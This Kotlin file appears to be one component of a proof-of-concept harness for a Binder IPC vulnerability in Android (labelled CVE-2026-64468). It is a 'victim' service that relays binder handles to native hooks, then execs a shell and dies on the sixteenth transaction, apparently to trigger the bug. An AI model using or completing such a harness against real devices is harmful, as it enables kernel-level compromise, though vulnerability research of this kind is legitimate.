package org.opencrown.binderprobe

import android.app.Service
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.ServiceConnection
import android.os.Binder
import android.os.IBinder
import android.os.Parcel
import android.os.Process
import android.util.Log
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger

/** P in the CVE-2026-64468 topology: receives e2, sends e1, then dies. */
class VictimService : Service() {
    private var walker: IBinder? = null
    private val seen = AtomicInteger(0)
    private val dying = AtomicBoolean(false)
    private val binder = object : Binder() {
        override fun onTransact(code: Int, data: Parcel, reply: Parcel?, flags: Int): Boolean {
            if (code != 1) return super.onTransact(code, data, reply, flags)
            val target = walker
            if (target == null) {
                Log.e("BinderHarness", "victim has no walker handle")
                return false
            }
            val rawB = runCatching { data.readStrongBinder() }.getOrNull()
            val expected = 16
            val bHandle = rawB?.let { BinderNative.nativeData(it) } ?: BinderNative.nativeData(target)
            val count = seen.incrementAndGet()
            return try {
                HarnessNative.victimChild(bHandle)
                Log.i("BinderHarness", "victim sent e1 count=$count/$expected")
                if (count >= expected && dying.compareAndSet(false, true)) {
                    Log.i("BinderHarness", "victim execing clean shell")
                    HarnessNative.victimExec()
                }
                true
            } catch (error: Throwable) {
                Log.e("BinderHarness", "victim child failed: $error")
                false
            }
        }
    }

    private val connection = object : ServiceConnection {
        override fun onServiceConnected(name: ComponentName, service: IBinder) {
            walker = service
            Log.i("BinderHarness", "victim connected to walker")
        }

        override fun onServiceDisconnected(name: ComponentName) {
            walker = null
        }
    }

    override fun onCreate() {
        super.onCreate()
        Log.i("BinderHarness", "victim pid=${Process.myPid()}")
        bindService(Intent(this, WalkerService::class.java), connection, Context.BIND_AUTO_CREATE)
    }

    override fun onBind(intent: Intent?): IBinder = binder
}
